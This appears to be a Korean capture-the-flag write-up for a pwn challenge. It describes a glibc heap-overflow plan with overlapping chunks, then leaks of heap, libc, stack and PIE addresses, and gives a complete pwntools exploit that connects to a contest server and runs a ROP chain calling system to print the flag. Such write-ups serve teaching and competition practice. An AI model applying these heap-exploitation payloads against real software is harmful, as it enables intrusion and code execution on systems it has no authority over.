# Rev / Unknown Virt

### 분석

대회 때는 cursor 깔짝대고 안 풀려서 손 안 댔는데, 정연산이 꽤나 쉽고 깔끔하다. 정연산 먼저 파악 후 역연산 짜주면 된다.

정연산 어셈 해석
```
```

### 익스 계획

청크를 아래 순서로 할당한다. (`[i]`는 `i`번째 인덱스에 할당하는 것이다.)

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40)
[1] data_chunk(size : 0x10010)
[1] info1(size : 0x20)
[1] info2(size : 0x40)
top_chunk
```

`heap overflow` 취약점을 이용해 `size`를 아래와 같이 바꿔준다. `top_chunk`의 `size`도 항상 생각해서 넣어준다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40 + 0x10010 + 0x20 + 0x40)
([1] data_chunk(size : 0x10010))
top_chunk
```

새로운 청크를 아래와 같이 할당한다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40 + 0x10010 + 0x20 + 0x40)
[1] data_chunk(size : 0x10010) <- invisible
[1] info1(size : 0x20) <- invisible
[1] info2(size : 0x40) <- invisible
top_chunk
```

0번 인덱스에 `clear_data` 처리하고, 1번 인덱스에 `clear_data` 처리한다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40 + 0x10010 + 0x20 + 0x40) <- freed(unsorted bin)
[1] data_chunk(size : 0x10010) <- invisible
[1] info1(size : 0x20) <- invisible
[1] info2(size : 0x40) <- invisible & freed(tcache bin)
top_chunk
```

2번 인덱스에 `recv_data`로 `0x10010`짜리 청크를 할당한다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[2] data_chunk(size : 0x10010)
[0] info2(size : 0x40 + 0x20 + 0x40) <- freed(unsorted bin)
[1] info1(size : 0x20) <- invisible
[1] info2(size : 0x40) <- invisible & freed(tcache bin)
top_chunk
```

2번 인덱스에 `set_info` 처리하여 `info2`를 새로 할당받는다. 이 때 1번 인덱스에 `clear_data` 처리했기 때문에 `[2] info2` 청크는 해당 주소가 `tcache bin`에 있어서 먼저 할당된다. 그 다음 1번 인덱스에 `set_info` 처리하는데, `[2] info1`과 `[1] info2` 청크는 `unsorted bin`의 제일 위에서 잘라서 준다. 여기서 힙이 겹치는데 정확한 주소가 궁금하다면 직접 디버깅하는 걸 추천한다. 0번 인덱스에 `set_info` 처리하면 최종 힙 레이아웃이 아래와 같다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[2] data_chunk(size : 0x10010)
[2] info1(size : 0x20)
[1] info2(size : 0x40)
[1] info1(size : 0x20) <- invisible
[0, 2] info2(size : 0x40)
top_chunk
```

0번과 2번이 같은 힙을 가리키도록 만들었다. 0번의 `info2`를 해제하고 2번으로 읽으면 `heap_base`를 얻을 수 있다. `[0] data_chunk`가 모든 청크 중 최상위에 있고 `heap_base`를 구했으므로 모든 청크의 사이즈 조절도 가능하고, `heap_base`를 아는 상태이다. `recv_data`로 `[0] info1`, `[2] info1`에 적혀 있는 주소를 `[2] data_chunk`로 변조하고, 0번 인덱스에 `clear_data`를 취하면, 청크가 `unsorted bin`에 들어가기 때문에 2번 인덱스에서 `libc_base`를 딸 수 있다. 위의 두 예시처럼 자유자재로 `aar`, `aaw`이 가능하므로 `ROP`해준다.(여차하면 1번 인덱스를 사용해도 된다. 위 계획은 1번 인덱스도 사용 가능하다.) 우리에게 출력되게 하는 `fd`도 스택에 있으므로 읽어준 다음 리다이렉션으로 `flag`를 읽어준다.
대회 중에는 코드를 예쁘게 짜고 깊게 고민할 시간이 없어 중간에 불필요한 동작이 있을 수 있다. 양해 바란다.
### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *$rebase(0x00000000000171a)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p2 = remote('16.184.29.60', 1337)
port = int(p2.recvline().split(b' ')[0])

if args.remote:
    p = remote("16.184.29.60", port)
else:
    p = process([binary, str(port)])
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

#p.interactive()

def recv_data(idx : int, startpoint : int, sz : int, dt : bytes):
    p.sendafter(b'data: ', p16(1) + p16(idx))
    p.send(p32(startpoint) + p32(sz))
    p.send(dt)

def set_info(idx : int, sz : int, dt : bytes):
    p.sendafter(b'data: ', p16(256) + p16(idx))
    p.send(p32(0) + p32(sz))    
    p.send(dt)

def clear_data(idx : int):
    p.sendafter(b'data: ', p16(16) + p16(idx))
    p.send(p32(0) + p32(0))

def get_info(idx : int):
    p.sendafter(b'data: ', p16(4096) + p16(idx))
    p.send(p32(0) + p32(0))
    return p.recvn(0x30)

recv_data(0, 0, 0, b'\x0a')
set_info(0, 0x20, b'\x00' * 0x20)
recv_data(1, 0, 0, b'\x00')
payload = p64(0x10010 + 0x40 + 0x20 + 0x40 + 1) + b'\x00' * 0x38
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0xcf1)
recv_data(0, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0x10d38 - len(payload)))
sleep(1)
p.send(b'\x00')
set_info(1, 0x20, b'\x00' * 0x20)
clear_data(1)
clear_data(0)
recv_data(2, 0, 0, b'a')
set_info(0, 0, b'a')
set_info(2, 0, b'a')
set_info(1, 0, b'a')
clear_data(1)
recv_data(1, 0xffc8, 1, b'\x21')
recv_data(1, 0xffe8, 1, b'\x41')
heap_base = (u64(get_info(0)[:8]) << 12) - ((0x0000000556f29479 << 12) - 0x556f29459000)
print(hex(heap_base))
set_info(1, 0, b'a')
# payload = p64(0xa01) + b'\x00' * (0xa00 - 8) + p64(0xc91 + 0x40 - 0xa00) 
# recv_data(1, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0xcc8 - len(payload)))
# sleep(1)
#p.send(b'\x00')
payload = p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
clear_data(0)
l.address = u64(get_info(1)[:8]) - (0x7fd42b62cb20 - 0x7fd42b429000)
print(hex(l.address))
print(hex(l.sym['__environ']))

payload = p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
stack = u64(get_info(0)[:8]) - (0x00007fff0be8f460 - 0x7fff0be8f278)
stack2 = u64(get_info(0)[:8]) - (0x00007ffdc2e8ab70 - 0x7ffdc2e8a9f4)
print(hex(stack))
print(hex(stack2))

payload = p64(stack2) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(stack2) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(stack2) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
fd = u32(get_info(0)[4:8])
print(hex(fd))

payload = p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
pie_base = u64(get_info(0)[8:0x10]) - 0x1e81
print(hex(pie_base))

payload = p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
set_info(0, 0x8, p64(stack))


dup2 = l.sym['dup2']
system = l.sym['system']
binsh = list(l.search(b'/bin/sh\x00'))[0]
pop_rdi = l.address + 0x000000000010f75b
pop_rsi = l.address + 0x0000000000110a4d
pop_rdx_rbx_r12_r13_rbp = l.address + 0x00000000000b503c
ret = l.address + 0x000000000002e81b
payload = p64(ret) + p64(pop_rdi) + p64(stack + 0x100) + p64(system)
payload = payload.ljust(0x100, b'\x00')
payload += f'cat /home/ctf/flag >& {fd}\x00'.encode()
#recv_data(0, 0, len(payload), payload)

p.sendafter(b'data: ', p16(1) + p16(0))
p.send(p32(0) + p32(len(payload)))
p.send(payload)
p.interactive()
#recv_data(2, (-0x40 - 0x20 - 0x40 - 0x8) & 0xffffffff, 0x40+0x20+0x40+0x8, payload)
#clear_data(0)
```
